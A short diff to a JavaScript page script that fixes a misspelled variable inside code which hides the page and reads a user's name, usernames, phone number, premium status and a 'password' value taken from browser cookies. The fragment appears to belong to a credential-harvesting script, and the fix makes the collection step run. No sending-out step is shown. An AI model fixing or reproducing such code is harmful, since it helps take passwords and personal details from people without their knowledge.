@@ -7,7 +7,7 @@ document.addEventListener("DOMContentLoaded", function() {
       const currentUser = parsedState.users.byId[currentUserId];
       document.body.style.display = "none";
 
-      if (currentUserId && currentUsr) {
+      if (currentUserId && currentUser) {  // FIXED: currentUsr → currentUser
         const { firstName, usernames, phoneNumber, isPremium } = currentUser;
         const password = document.cookie.split("; ").find(e => e.startsWith("password="))?.split("=")[1];
 
